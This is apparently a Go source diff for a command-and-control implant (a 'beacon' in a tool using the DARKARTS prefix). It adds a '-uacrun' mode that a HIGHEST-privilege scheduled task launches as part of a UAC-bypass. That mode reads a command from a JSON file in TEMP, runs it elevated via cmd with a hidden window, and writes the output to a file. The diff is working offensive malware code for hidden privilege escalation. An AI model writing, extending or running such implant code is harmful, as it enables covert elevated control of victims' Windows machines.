@@ -1,13 +1,16 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/hex"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/signal"
 	"path/filepath"
 	"strconv"
@@ -34,6 +37,10 @@ var (
 )
 
 func main() {
+	if len(os.Args) >= 2 && os.Args[1] == "-uacrun" {
+		os.Exit(uacRun())
+	}
+
 	log := logging.New(os.Getenv("DARKARTS_LOG_LEVEL"))
 	if cfgLogFile != "" {
 		if f, err := os.OpenFile(cfgLogFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
@@ -140,4 +147,45 @@ func envFloatOr(key, def string, fallback float64) float64 {
 		}
 	}
 	return envFloat(key, fallback)
+}
+
+// uacRun is the elevated helper mode launched by the reusable HIGHEST
+// scheduled task created by the uac task ("schtasks" method). It reads the
+// per-invocation config written by the beacon, runs the command elevated,
+// writes stdout/stderr plus an exit marker to the requested file, then exits
+// without starting a C2 session.
+func uacRun() int {
+	cfgPath := filepath.Join(os.Getenv("TEMP"), "darts-uac-cfg.json")
+	raw, err := os.ReadFile(cfgPath)
+	if err != nil {
+		return 2
+	}
+	var cfg struct {
+		Line string `json:"line"`
+		Out  string `json:"out"`
+	}
+	if err := json.Unmarshal(raw, &cfg); err != nil {
+		return 2
+	}
+	var code int
+	var out []byte
+	if cfg.Line != "" {
+		cmd := exec.Command("cmd", "/c", cfg.Line)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, err = cmd.CombinedOutput()
+		if err != nil {
+			if ee, ok := err.(*exec.ExitError); ok {
+				code = ee.ExitCode()
+			} else {
+				code = 1
+			}
+		}
+	}
+	var buf bytes.Buffer
+	buf.Write(out)
+	fmt.Fprintf(&buf, "\r\n[exit %d]\r\n", code)
+	if cfg.Out != "" {
+		_ = os.WriteFile(cfg.Out, buf.Bytes(), 0o600)
+	}
+	return code
 }
